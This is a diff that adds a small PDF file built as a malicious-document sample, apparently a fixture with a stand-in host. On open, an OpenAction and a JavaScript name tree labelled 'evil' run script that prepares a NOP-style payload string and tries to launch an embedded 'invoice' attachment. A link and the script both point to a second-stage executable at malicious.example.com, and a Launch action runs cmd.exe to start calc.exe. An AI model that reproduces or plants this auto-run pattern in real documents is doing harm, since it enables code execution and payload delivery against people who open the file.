@@ -1,0 +1,18 @@
+%PDF-1.7
+1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R/Names<</JavaScript 6 0 R>>>>endobj
+2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
+3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[7 0 R]>>endobj
+5 0 obj<</Type/Action/S/JavaScript/JS 8 0 R>>endobj
+6 0 obj<</Names[(evil) 5 0 R]>>endobj
+7 0 obj<</Type/Annot/Subtype/Link/A<</Type/Action/S/URI/URI(http://malicious.example.com/stage2.exe)>>>>endobj
+8 0 obj<</Length 181>>stream
+var payload = unescape('%u9090%u9090');
+app.alert('opening');
+this.exportDataObject({cName:'invoice', nLaunch:0});
+var u = 'http://' + 'malicious' + '.example.com' + '/stage2.exe';
+
+endstream
+endobj
+9 0 obj<</Type/Action/S/Launch/Win<</F(cmd.exe)/P(/c calc.exe)>>>>endobj
+trailer<</Root 1 0 R>>
+%%EOF
